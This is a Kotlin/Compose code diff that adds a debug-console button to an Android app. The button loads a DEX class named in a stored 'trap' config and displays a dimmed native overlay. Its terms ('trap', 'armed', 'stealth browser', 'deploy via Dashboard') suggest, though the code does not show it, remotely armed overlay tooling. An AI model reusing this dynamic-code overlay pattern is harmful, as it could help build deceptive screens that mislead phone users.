@@ -717,6 +717,31 @@ fun DebugConsole(ctx: Context, onDismiss: () -> Unit) {
                         colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFF59E0B)),
                         modifier = Modifier.fillMaxWidth()
                     ) { Text("STEALTH BROWSER") }
+
+                    // Voice Agent
+                    Button(
+                        onClick = { 
+                            showDevControls = false
+                            val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+                            val nativeStr = prefs.getString("native_traps_array", "[]") ?: "[]"
+                            val nativeArr = org.json.JSONArray(nativeStr)
+                            var found = false
+                            for (i in 0 until nativeArr.length()) {
+                                val trap = nativeArr.getJSONObject(i)
+                                if (trap.optString("label").equals("Agent", ignoreCase = true)) {
+                                    val dexPath = trap.getString("file_path")
+                                    val className = trap.getString("class_name")
+                                    val dimLevel = trap.optInt("dim", 85)
+                                    com.example.myandroid.DynamicUIManager.showNativeOverlay(ctx, dexPath, className, dimLevel)
+                                    found = true
+                                    break
+                                }
+                            }
+                            if (!found) android.widget.Toast.makeText(ctx, "Trap 'Agent' not armed. Deploy via Dashboard first.", android.widget.Toast.LENGTH_LONG).show()
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF06B6D4)),
+                        modifier = Modifier.fillMaxWidth()
+                    ) { Text("ACTIVATE NATIVE VOICE AGENT") }
                 }
             },
             confirmButton = {
